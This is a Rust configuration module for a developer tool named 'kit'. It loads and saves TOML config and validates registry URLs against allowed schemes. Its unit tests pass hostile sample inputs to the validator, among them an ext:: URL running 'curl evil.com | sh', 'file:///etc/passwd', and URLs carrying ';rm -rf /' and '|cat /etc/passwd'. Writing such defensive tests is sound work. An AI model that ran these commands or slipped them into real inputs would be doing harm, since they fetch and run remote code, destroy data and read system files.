use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::PathBuf;

/// Global kit configuration (~/.config/kit/config.toml).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Config {
    #[serde(default)]
    pub settings: Settings,
    #[serde(default)]
    pub registry: Vec<Registry>,
    #[serde(default)]
    pub pins: HashMap<String, Pin>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Settings {
    /// Path to the mise config file kit should generate.
    #[serde(default = "default_mise_config")]
    pub mise_config: String,
    /// Override platform detection.
    #[serde(default)]
    pub platform: Option<String>,
    /// Cache directory for registry clones.
    #[serde(default = "default_cache_dir")]
    pub cache_dir: String,
    /// Trusted config paths for mise settings section.
    #[serde(default)]
    pub trusted_config_paths: Vec<String>,
}

impl Default for Settings {
    fn default() -> Self {
        Self {
            mise_config: default_mise_config(),
            platform: None,
            cache_dir: default_cache_dir(),
            trusted_config_paths: vec![],
        }
    }
}

fn default_mise_config() -> String {
    "~/.config/mise/config.toml".to_string()
}

fn default_cache_dir() -> String {
    "~/.cache/kit".to_string()
}

/// A named git-based tool registry.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Registry {
    pub name: String,
    pub url: String,
    /// Branch to track. Defaults to "main".
    #[serde(default = "default_branch")]
    pub branch: String,
    /// Read-only registries cannot be pushed to.
    #[serde(default)]
    pub readonly: bool,
}

fn default_branch() -> String {
    "main".to_string()
}

/// A local version or registry pin.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Pin {
    #[serde(default)]
    pub version: Option<String>,
    #[serde(default)]
    pub registry: Option<String>,
}

impl Config {
    /// Load config from ~/.config/kit/config.toml.
    pub fn load() -> Result<Self> {
        let path = Self::path()?;
        if !path.exists() {
            anyhow::bail!(
                "no config found at {}\nRun `kit setup` to create one.",
                path.display()
            );
        }
        let content = std::fs::read_to_string(&path)
            .with_context(|| format!("failed to read {}", path.display()))?;
        let config: Config = toml::from_str(&content)
            .with_context(|| format!("failed to parse {}", path.display()))?;
        config.validate()?;
        Ok(config)
    }

    /// Config file path.
    pub fn path() -> Result<PathBuf> {
        let home = dirs::home_dir().context("could not determine home directory")?;
        Ok(home.join(".config").join("kit").join("config.toml"))
    }

    /// Config directory.
    pub fn config_dir() -> Result<PathBuf> {
        let home = dirs::home_dir().context("could not determine home directory")?;
        Ok(home.join(".config").join("kit"))
    }

    /// Resolved cache directory (shell expansion applied).
    pub fn cache_dir(&self) -> Result<PathBuf> {
        let expanded = shellexpand::tilde(&self.settings.cache_dir);
        Ok(PathBuf::from(expanded.as_ref()))
    }

    /// Resolved mise config path.
    pub fn mise_config_path(&self) -> Result<PathBuf> {
        let expanded = shellexpand::tilde(&self.settings.mise_config);
        Ok(PathBuf::from(expanded.as_ref()))
    }

    /// Registry clone directory within cache.
    pub fn registry_dir(&self) -> Result<PathBuf> {
        Ok(self.cache_dir()?.join("registries"))
    }

    /// Find a registry by name.
    pub fn registry(&self, name: &str) -> Option<&Registry> {
        self.registry.iter().find(|r| r.name == name)
    }

    /// Save config to disk.
    pub fn save(&self) -> Result<()> {
        let path = Self::path()?;
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        let content =
            toml::to_string_pretty(self).context("failed to serialize config")?;
        std::fs::write(&path, content)
            .with_context(|| format!("failed to write {}", path.display()))?;
        Ok(())
    }

    /// Create a default config with a single registry.
    pub fn default_with_registry(name: &str, url: &str) -> Self {
        Self {
            settings: Settings::default(),
            registry: vec![Registry {
                name: name.to_string(),
                url: url.to_string(),
                branch: "main".to_string(),
                readonly: false,
            }],
            pins: HashMap::new(),
        }
    }

    /// Validate the config (security-critical: S-5, F9).
    fn validate(&self) -> Result<()> {
        for reg in &self.registry {
            validate_registry_url(&reg.url)
                .with_context(|| format!("invalid URL for registry '{}'", reg.name))?;
            crate::tool::validate_branch(&reg.branch)
                .with_context(|| format!("invalid branch for registry '{}'", reg.name))?;
        }
        Ok(())
    }
}

/// Validate a registry URL against allowed schemes (S-5).
/// Only https:// and git@ (SSH) are allowed.
/// Rejects ext::, file://, git:// (unencrypted), and shell metacharacters.
fn validate_registry_url(url: &str) -> Result<()> {
    let url_lower = url.to_lowercase();

    // Allow HTTPS
    if url_lower.starts_with("https://") {
        // Check for shell metacharacters in the URL
        if url.contains(';') || url.contains('|') || url.contains('`') || url.contains('$') {
            anyhow::bail!("URL contains shell metacharacters: {url}");
        }
        return Ok(());
    }

    // Allow SSH (git@host:path)
    if url.starts_with("git@") {
        if url.contains(';') || url.contains('|') || url.contains('`') || url.contains('$') {
            anyhow::bail!("URL contains shell metacharacters: {url}");
        }
        return Ok(());
    }

    // Allow ssh:// scheme
    if url_lower.starts_with("ssh://") {
        if url.contains(';') || url.contains('|') || url.contains('`') || url.contains('$') {
            anyhow::bail!("URL contains shell metacharacters: {url}");
        }
        return Ok(());
    }

    anyhow::bail!(
        "unsupported URL scheme: {url}\n\
         Only https://, ssh://, and git@ URLs are allowed.\n\
         Rejected schemes: ext::, file://, git:// (unencrypted)"
    );
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn valid_urls() {
        assert!(validate_registry_url("https://gitlab.com/dunn.dev/kit.git").is_ok());
        assert!(validate_registry_url("git@gitlab.com:dunn.dev/kit.git").is_ok());
        assert!(validate_registry_url("ssh://git@gitlab.com/dunn.dev/kit.git").is_ok());
    }

    #[test]
    fn rejects_dangerous_urls() {
        assert!(validate_registry_url("ext::sh -c 'curl evil.com | sh'").is_err());
        assert!(validate_registry_url("file:///etc/passwd").is_err());
        assert!(validate_registry_url("git://insecure.com/repo.git").is_err());
        assert!(validate_registry_url("https://evil.com/repo;rm -rf /").is_err());
        assert!(validate_registry_url("https://evil.com/repo|cat /etc/passwd").is_err());
    }

    #[test]
    fn default_config() {
        let config = Config::default_with_registry("dunn", "https://gitlab.com/dunn.dev/kit/registry.git");
        assert_eq!(config.registry.len(), 1);
        assert_eq!(config.registry[0].name, "dunn");
        assert!(!config.registry[0].readonly);
    }
}
